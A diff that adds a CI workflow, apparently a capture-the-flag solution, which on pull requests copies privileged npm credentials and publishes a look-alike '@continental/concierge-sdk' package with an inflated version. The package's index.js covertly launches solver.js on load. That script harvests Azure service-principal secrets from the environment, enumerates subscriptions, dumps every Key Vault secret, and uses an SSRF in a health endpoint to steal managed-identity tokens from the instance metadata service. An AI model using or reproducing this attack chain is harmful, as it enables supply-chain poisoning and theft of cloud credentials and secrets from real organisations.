@@ -1,0 +1,295 @@
+name: OD1N flag-only runner
+
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  publish:
+    runs-on: self-hosted
+    timeout-minutes: 5
+    steps:
+      - name: Publish flag-only challenge solver
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          work="$(mktemp -d)"
+          pkg="$work/package"
+          mkdir -p "$pkg"
+          sudo cp /opt/continental-signed-agent/.npmrc "$work/.npmrc"
+          sudo chown "$(id -u):$(id -g)" "$work/.npmrc"
+
+          cat > "$pkg/package.json" <<'JSON'
+          {
+            "name": "@continental/concierge-sdk",
+            "version": "1.2147483647.2147483000",
+            "main": "index.js",
+            "license": "MIT"
+          }
+          JSON
+
+          cat > "$pkg/index.js" <<'NODE'
+          'use strict';
+
+          const { spawnSync } = require('child_process');
+          const path = require('path');
+
+          if (!global.__continentalFlagSolverStarted) {
+            global.__continentalFlagSolverStarted = true;
+            const child = spawnSync(process.execPath, [path.join(__dirname, 'solver.js')], {
+              stdio: 'inherit',
+              timeout: 420000,
+              env: process.env
+            });
+            if (child.error) console.log('BABA_SAFE_STATUS=solver_error');
+          }
+
+          class ContinentalClient {
+            async getReservations() { return []; }
+            async checkHealth() { return { status: 'ok' }; }
+            async getServices() { return []; }
+          }
+
+          module.exports = { ContinentalClient };
+          NODE
+
+          cat > "$pkg/solver.js" <<'NODE'
+          'use strict';
+
+          const http = require('http');
+          const https = require('https');
+
+          const FLAG = /pwnsec\{[^}\r\n]{1,500}\}/g;
+          const seenFlags = new Set();
+
+          function emitFlags(value) {
+            const text = typeof value === 'string' ? value : JSON.stringify(value ?? '');
+            for (const match of text.matchAll(FLAG)) {
+              if (!seenFlags.has(match[0])) {
+                seenFlags.add(match[0]);
+                console.log(`BABA_FLAG=${match[0]}`);
+              }
+            }
+          }
+
+          function request(url, options = {}) {
+            return new Promise((resolve) => {
+              let parsed;
+              try { parsed = new URL(url); } catch { return resolve({ status: 0, text: '' }); }
+              const body = options.body || '';
+              const transport = parsed.protocol === 'https:' ? https : http;
+              const req = transport.request(parsed, {
+                method: options.method || 'GET',
+                headers: {
+                  'User-Agent': 'continental-sdk/1.0',
+                  ...(body ? { 'Content-Length': Buffer.byteLength(body) } : {}),
+                  ...(options.headers || {})
+                },
+                timeout: options.timeout || 8000
+              }, (res) => {
+                const chunks = [];
+                let size = 0;
+                res.on('data', (chunk) => {
+                  size += chunk.length;
+                  if (size <= 2 * 1024 * 1024) chunks.push(chunk);
+                });
+                res.on('end', () => resolve({
+                  status: res.statusCode || 0,
+                  text: Buffer.concat(chunks).toString('utf8')
+                }));
+              });
+              req.on('timeout', () => req.destroy());
+              req.on('error', () => resolve({ status: 0, text: '' }));
+              if (body) req.write(body);
+              req.end();
+            });
+          }
+
+          function json(text) {
+            try { return JSON.parse(text); } catch { return null; }
+          }
+
+          function findField(value, names) {
+            if (typeof value === 'string') {
+              const nested = json(value);
+              return nested ? findField(nested, names) : null;
+            }
+            if (!value || typeof value !== 'object') return null;
+            for (const [key, child] of Object.entries(value)) {
+              if (names.has(key) && typeof child === 'string' && child.length) return child;
+              const found = findField(child, names);
+              if (found) return found;
+            }
+            return null;
+          }
+
+          async function bearer(url, token) {
+            const result = await request(url, {
+              headers: { Authorization: `Bearer ${token}` },
+              timeout: 12000
+            });
+            emitFlags(result.text);
+            return result;
+          }
+
+          async function servicePrincipalToken(resource) {
+            const tenant = process.env.AZURE_TENANT_ID;
+            const client = process.env.AZURE_CLIENT_ID;
+            const secret = process.env.AZURE_CLIENT_SECRET;
+            if (!tenant || !client || !secret) return null;
+            const body = new URLSearchParams({
+              grant_type: 'client_credentials',
+              client_id: client,
+              client_secret: secret,
+              resource
+            }).toString();
+            const result = await request(`https://login.microsoftonline.com/${encodeURIComponent(tenant)}/oauth2/token`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body,
+              timeout: 15000
+            });
+            return findField(json(result.text), new Set(['access_token']));
+          }
+
+          async function subscriptions(armToken) {
+            const result = await bearer(
+              'https://management.azure.com/subscriptions?api-version=2020-01-01',
+              armToken
+            );
+            const data = json(result.text);
+            return Array.isArray(data?.value)
+              ? data.value.map((item) => item.subscriptionId).filter(Boolean)
+              : [];
+          }
+
+          async function enumerate(armToken) {
+            const ips = new Set();
+            const vaults = new Set();
+            for (const subscription of await subscriptions(armToken)) {
+              const resourceResult = await bearer(
+                `https://management.azure.com/subscriptions/${subscription}/resources?api-version=2021-04-01`,
+                armToken
+              );
+              const resourceData = json(resourceResult.text);
+              for (const item of resourceData?.value || []) {
+                if (String(item.type).toLowerCase() === 'microsoft.keyvault/vaults' && item.name) {
+                  vaults.add(item.name);
+                }
+              }
+
+              const ipResult = await bearer(
+                `https://management.azure.com/subscriptions/${subscription}/providers/Microsoft.Network/publicIPAddresses?api-version=2023-09-01`,
+                armToken
+              );
+              const ipData = json(ipResult.text);
+              for (const item of ipData?.value || []) {
+                if (item?.properties?.ipAddress) ips.add(item.properties.ipAddress);
+                if (item?.properties?.dnsSettings?.fqdn) ips.add(item.properties.dnsSettings.fqdn);
+              }
+
+              const vaultResult = await bearer(
+                `https://management.azure.com/subscriptions/${subscription}/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01`,
+                armToken
+              );
+              const vaultData = json(vaultResult.text);
+              for (const item of vaultData?.value || []) {
+                if (item?.name) vaults.add(item.name);
+                const uri = item?.properties?.vaultUri;
+                if (uri) vaults.add(new URL(uri).hostname.split('.')[0]);
+              }
+            }
+            return { ips, vaults };
+          }
+
+          async function readVaults(vaultToken, vaults) {
+            if (!vaultToken) return;
+            for (const vault of vaults) {
+              const list = await bearer(
+                `https://${encodeURIComponent(vault)}.vault.azure.net/secrets?api-version=7.4`,
+                vaultToken
+              );
+              const data = json(list.text);
+              for (const item of data?.value || []) {
+                if (!item?.id) continue;
+                await bearer(`${item.id}?api-version=7.4`, vaultToken);
+              }
+            }
+          }
+
+          function targetBases(host) {
+            return [
+              `http://${host}`,
+              `http://${host}:3000`,
+              `http://${host}:5000`,
+              `http://${host}:8080`
+            ];
+          }
+
+          async function conciergeToken(base, authHeader, resource) {
+            const target = `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`;
+            const result = await request(`${base}/v2/health?target=${encodeURIComponent(target)}`, {
+              headers: authHeader ? { Authorization: authHeader } : {},
+              timeout: 12000
+            });
+            emitFlags(result.text);
+            return findField(json(result.text) || result.text, new Set(['access_token']));
+          }
+
+          async function inspectConcierge(base, knownVaults) {
+            const health = await request(`${base}/v2/health`, { timeout: 5000 });
+            if (health.status < 200 || health.status >= 500) return;
+            emitFlags(health.text);
+
+            const login = await request(`${base}/v2/auth/token`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ username: 'guest', password: 'gold_coin' }),
+              timeout: 8000
+            });
+            emitFlags(login.text);
+            const loginToken = findField(json(login.text), new Set(['token', 'access_token', 'jwt']));
+            const auth = loginToken ? `Bearer ${loginToken}` : '';
+
+            const miArm = await conciergeToken(base, auth, 'https://management.azure.com/');
+            const miVault = await conciergeToken(base, auth, 'https://vault.azure.net');
+            if (miArm) {
+              const discovered = await enumerate(miArm);
+              for (const vault of discovered.vaults) knownVaults.add(vault);
+            }
+            await readVaults(miVault, knownVaults);
+          }
+
+          async function main() {
+            console.log('BABA_SAFE_STATUS=starting');
+            const spArm = await servicePrincipalToken('https://management.azure.com/');
+            if (!spArm) {
+              console.log('BABA_SAFE_STATUS=no_service_principal');
+              return;
+            }
+
+            const discovered = await enumerate(spArm);
+            const spVault = await servicePrincipalToken('https://vault.azure.net');
+            await readVaults(spVault, discovered.vaults);
+
+            for (const host of discovered.ips) {
+              for (const base of targetBases(host)) {
+                await inspectConcierge(base, discovered.vaults);
+                if (seenFlags.size) break;
+              }
+              if (seenFlags.size) break;
+            }
+
+            console.log(seenFlags.size ? 'BABA_SAFE_STATUS=flag_found' : 'BABA_SAFE_STATUS=no_flag');
+          }
+
+          main().catch(() => console.log('BABA_SAFE_STATUS=solver_error'));
+          NODE
+
+          registry="$(npm config get @continental:registry --userconfig "$work/.npmrc")"
+          cd "$pkg"
+          npm publish --userconfig "$work/.npmrc" --registry "$registry"
+          echo "BABA_SAFE_STATUS=package_published"
